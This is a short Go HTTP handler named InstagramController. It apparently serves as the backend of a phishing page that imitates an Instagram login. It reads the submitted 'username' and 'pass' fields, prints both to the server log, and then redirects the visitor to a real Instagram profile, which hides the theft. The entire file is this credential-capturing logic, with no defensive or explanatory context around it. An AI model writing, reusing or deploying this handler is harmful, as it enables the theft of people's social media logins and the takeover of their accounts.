package controller

import (
	"fmt"
	"net/http"
)

func InstagramController(w http.ResponseWriter, r *http.Request) {
	fmt.Println(r.FormValue("username"))
	fmt.Println(r.FormValue("pass"))
	http.Redirect(w, r, "https://instagram.com/munzirmussafi", http.StatusSeeOther)
}
